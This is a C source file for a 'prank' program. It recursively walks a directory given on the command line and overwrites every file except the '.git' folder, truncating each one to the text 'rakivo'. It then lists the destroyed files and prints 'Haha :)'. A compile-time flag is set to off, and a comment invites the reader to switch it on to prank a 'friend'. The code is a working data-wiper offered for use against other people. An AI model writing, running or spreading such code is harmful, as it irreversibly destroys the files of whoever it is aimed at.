#include "main.h"

#define CORRUPT 0 // <- change this one to prank you "friend"
#define WRITE_WHAT "rakivo\n" // <- change this one to change the content that will be written

const char* const IGNORED[IGNORED_CAP] = {".", "..", ".git"};

char** corrupted_files;
size_t corrupted_files_counter = 0;
size_t corrupted_files_curr_cap = CORRUPTED_FILES_CAP;

void write(const char* const file_name, FILE* file)
{
    if (!file) {
        printf("ERROR: Couldn't open file: %s!\n", file_name);
        exit(1);
    }

    fprintf(file, WRITE_WHAT);

    if (corrupted_files_counter == corrupted_files_curr_cap) {
        corrupted_files = realloc(corrupted_files, (corrupted_files_curr_cap *= 1.5) * sizeof(char*));
        if (!corrupted_files) {
            perror("Couldn't reallocate memory for corrupted_files");
            exit(1);
        }
    }
    corrupted_files[corrupted_files_counter] = malloc(strlen(file_name) + 1);
    if (!corrupted_files[corrupted_files_counter]) {
        perror("Couldn't allocate memory for corrupted file");
        exit(1);
    }

    strcpy(corrupted_files[corrupted_files_counter], file_name);
    corrupted_files_counter++;

    fclose(file);
}

#ifdef _WIN32
void corrupt(const char* const dir_path)
{
    OPEN_DIR(hFind, findData, dir_path);
    
    while(FindNextFile(hFind, &findData)) {
        const char* name = findData.cFileName;
        if (isignored(name) == 0) continue;
        
        char path[PATH_CAP];
        GET_PATH(path, dir_path, name);

        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            write(path, fopen(path, "w"));
        } else {
            corrupt(path);
        }
    }

    FindClose(hFind);
}

#else
void corrupt(const char* const dir_path)
{
    OPEN_DIR(dp, ep, dir_path);

    while ((ep = readdir(dp))) {
        const char* name = ep->d_name;
        if (isignored(name) == 0) continue;

        char path[PATH_CAP];
        GET_PATH(path, dir_path, name);

        if (isfile(path)) {
            write(path, fopen(path, "w"));
        } else {
            corrupt(path);
        }
    }

    if (closedir(dp) != 0) {
        perror("Couldn't close the directory");
        exit(1);
    }
}
#endif

int main(const int argc, const char* const* const argv)
{
    if (argc != 2) {
        printf("USAGE: %s <dir_path>\n", argv[0]);
        return 1;
    }

#if CORRUPT
    corrupted_files = malloc(CORRUPTED_FILES_CAP * sizeof(char*));
    if (!corrupted_files) {
        perror("Couldn't allocate memory for corrupted file");
        return 1;
    }

    corrupt(argv[1]);

    printf(  "< ==================== +++ +++ ==================== >\n");
    printf("Now you have %zu corrupted files, here they all are: ", corrupted_files_counter);
    printf("\n< ==================== +++ +++ ==================== >\n\n");

    for (size_t i = 0; i < corrupted_files_counter; ++i) {
        printf("%s\n", corrupted_files[i]);
        free(corrupted_files[i]);
    }

    free(corrupted_files);

    printf("Haha :)");
#endif

    return 0;
}
